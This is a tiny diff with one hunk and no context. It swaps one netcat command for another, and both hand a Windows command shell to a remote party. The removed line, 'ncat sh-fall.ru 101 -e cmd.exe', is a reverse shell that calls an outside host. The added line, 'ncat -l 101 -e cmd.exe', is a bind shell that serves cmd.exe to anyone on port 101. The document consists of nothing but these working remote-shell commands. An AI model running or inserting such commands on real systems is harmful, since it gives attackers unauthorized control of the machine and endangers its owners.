@@ -1,1 +1,1 @@
-ncat sh-fall.ru 101 -e cmd.exe 
+ncat -l 101 -e cmd.exe 
